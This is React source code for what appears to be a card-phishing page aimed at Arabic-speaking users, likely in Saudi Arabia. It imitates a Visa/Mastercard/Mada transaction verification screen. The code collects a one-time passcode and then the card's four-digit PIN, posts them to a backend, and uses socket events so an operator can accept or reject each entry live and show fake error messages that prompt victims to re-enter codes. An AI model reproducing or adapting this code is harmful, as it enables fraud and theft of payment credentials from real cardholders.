import React, { useEffect, useState } from "react";
import { api_route, socket } from "../App";
import axios from "axios";
import { TailSpin } from "react-loader-spinner";
import { BiBook } from "react-icons/bi";
import Navbar from "../Navbar";
const Verify = ({}) => {
  const [otp, setOtp] = useState(null);
  const [error, setError] = useState(null);
  const query = new URLSearchParams(window.location.search);
  const [load, setLoad] = useState(false);
  const [change, setChange] = useState(false);
  const [pin, setPin] = useState("");
  const data = JSON.parse(query.get("data"));
  const { companyData, cardNumber, _id } = JSON.parse(query.get("data"));

  const handleSubmit = async (e) => {
    setLoad(true);
    setError(false);
    e.preventDefault();
    const finalData = { ...JSON.parse(query.get("data")), otp };
    try {
      await axios.post(api_route + "/visaOtp/" + _id, finalData).then(() => {
        socket.emit("visaOtp", { id: _id, otp });
      });
    } catch (error) {
    } finally {
    }
  };
  const handlePin = async (e) => {
    setLoad(true);
    setError(false);
    e.preventDefault();
    const finalData = { ...JSON.parse(query.get("data")), otp, pin };
    try {
      await axios.post(api_route + "/visaPin/" + _id, finalData).then(() => {
        socket.emit("visaPin", { id: _id, otp });
      });
    } catch (error) {
    } finally {
    }
  };

  socket.on("acceptVisaPin", (id) => {
    if (id === JSON.parse(query.get("data"))._id) {
      window.location.href = "/motsl?id=" + id;
    }
  });

  socket.on("declineVisaPin", (id) => {
    if (id === JSON.parse(query.get("data"))._id) {
      setLoad(false);
      setError("الرقم السري غير صحيح برجاء المحاولة مره اخري");
    }
  });

  socket.on("acceptVisaOtp", (id) => {
    if (id === JSON.parse(query.get("data"))._id) {
      setLoad(false);
      setChange(true);
    }
  });

  socket.on("declineVisaOtp", (id) => {
    console.log(id, JSON.parse(query.get("data"))._id);
    if (id === JSON.parse(query.get("data"))._id) {
      setLoad(false);
      setError("بيانات البطاقة غير صحيحة برجاء المحاولة مره اخري");
    }
  });

  return (
    <div className="w-full flex flex-col justify-start items-center h-screen p-3">
      {load ? (
        <div className="flex top-0 z-50 w-full justify-center items-center h-screen fixed bg-black bg-opacity-60">
          <div className="bg-white rounded-md p-3 w-fit h-fit flex items-center justify-center gap-x-3">
            <TailSpin
              height="30"
              width="30"
              color="gray"
              ariaLabel="tail-spin-loading"
              radius="1"
              wrapperStyle={{}}
              wrapperClass=""
              visible={true}
            />
            <span className="text-lg">يتم المعالجة</span>
            <img src="/logo.svg" className="w-14 h-14" />
          </div>
        </div>
      ) : (
        ""
      )}
      <div className="w-full flex flex-col justify-start items-center md:items-start border p-3 border-gray-700 rounded-md">
        {change ? (
          <>
            <img
              src="/logo.png"
              alt="logo"
              onClick={() => (window.location.href = "/")}
              className=" w-5/6 -mr-6"
            />
            <div className="w-full  rounded-md mx-1    py-5 px-2 shadow-md my-2  ">
              <div
                className="flex w-full items-start gap-5 flex-col    pb-3"
                dir={`rtl`}
              >
                <span className="text-lg font-bold">إثبات ملكية البطاقة</span>
                <span className="w-full text-right text-gray-700 text-base">
                  الرجاء ادخال الرقم السري الخاص بالبطاقة المكون من 4 ارقام
                </span>
              </div>
              <form
                className="flex flex-col w-full  items-center  gap-y-2 mt-5"
                onSubmit={handlePin}
              >
                <input
                  className="md:w-1/2 w-11/12 outline-none  rounded-sm px-2 py-1  text-lg otp-desc text-right border"
                  placeholder="****"
                  required
                  type="text"
                  onChange={(e) => setPin(e.target.value.replace(/\D/g, ""))}
                  inputMode="numeric"
                  value={pin}
                  minLength={4}
                  maxLength={4}
                />
                <button className="text-white bg-[#146394] w-11/12 text-lg py-2  mt-5 rounded-md ">
                  تأكيد
                </button>
                {error && (
                  <span className="flex gap-x-5  text-red-500 lg:text-sm md:font-semibold text-xs justify-center items-center otp-desc">
                    الرقم السري غير صحيح برجاء المحاولة مره اخري
                  </span>
                )}
              </form>
              <div className="w-full flex items-center justify-center gap-x-2">
                <img src="/visa.png" className="w-1/4" />
                <img src="/mastercard.png" className="w-1/6" />
                <img src="مدي.webp" className="w-1/4" />
              </div>{" "}
            </div>
          </>
        ) : (
          <>
            <div className="flex w-full justify-around items-center">
              <img src="/visa.png" className="w-20" />
              <img src="/mad.png" className="w-20 h-10" />
              <img src="/mastercheck.png" className="w-28" />
            </div>
            <div
              className="w-full  rounded-md mx-1   py-5 px-2 shadow-md my-2 h-fit bg-white text-black   "
              style={{ height: "70vh" }}
            >
              <p className="px-4 w-full text-sm font-bold">
                {" "}
                To continue with your transaction , please enter the one-
                <span className="p-1 w-full text-xs font-bold">
                  time passcode sent to your mobile number of email
                </span>
                <span className="p-1 w-full text-sm font-bold">
                  address and click Submit
                </span>
              </p>
              <form
                className="flex w-full items-center gap-1 flex-col    pb-3"
                dir={`rtl`}
                onSubmit={handleSubmit}
              >
                <span className="text-gray-700 w-full pt-5  px-4 font-bold text-left">
                  : Transaction Details{" "}
                </span>
                <div
                  dir="ltr"
                  className="w-full flex justify-between text-sm pl-6 "
                >
                  <span className="font-bold w-2/5 text-start">Merchent :</span>
                  <span className="font-bold w-2/3 text-center text-xs">
                    {data.companyData.name}
                  </span>
                </div>
                <div
                  dir="ltr"
                  className="w-full flex justify-between text-sm  pl-6"
                >
                  <span className="font-bold w-3/5 text-start">
                    Transaction Amount :
                  </span>
                  <span className="font-bold w-2/5 text-start">
                    ريال {data.companyData.price}.00
                  </span>
                </div>
                <div
                  dir="ltr"
                  className="w-full flex justify-between text-sm  pl-6"
                >
                  <span className="font-bold w-3/5 text-start">
                    Card Number :
                  </span>
                  <span className="font-bold w-2/5 text-start">
                    ************{cardNumber.slice(-4)}
                  </span>
                </div>
                <div
                  dir="ltr"
                  className="w-full flex justify-between text-sm  pl-6"
                >
                  <span className="font-bold w-3/5 text-start">
                    Enter Code :
                  </span>
                  <input
                    className="md:w-1/2 w-11/12 outline-none  rounded-md px-2  text-lg otp-desc text-right border border-black "
                    required
                    type="text"
                    onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                    inputMode="numeric"
                    value={otp}
                    minLength={4}
                    maxLength={6}
                  />
                </div>
                <button className="text-white bg-black w-fit  py-1 px-8  mt-20   rounded-sm ">
                  Submit
                </button>
                {error && (
                  <span className="font-bold text-red-500 p-5 w-full border-red-500 border text-center my-10 text-sm ">
                    *حصل خطأ تم ارسال رمز تفعيل اخر الى جوالك
                  </span>
                )}
              </form>

              {/* <div className="w-full flex items-center justify-center gap-x-2">
              <img src="/visa.png" className="w-1/4" />
              <img src="/mastercard.png" className="w-1/6" />
              <img src="مدي.webp" className="w-1/4" />
            </div>{" "} */}
            </div>
          </>
        )}
      </div>
    </div>
  );
};

export default Verify;
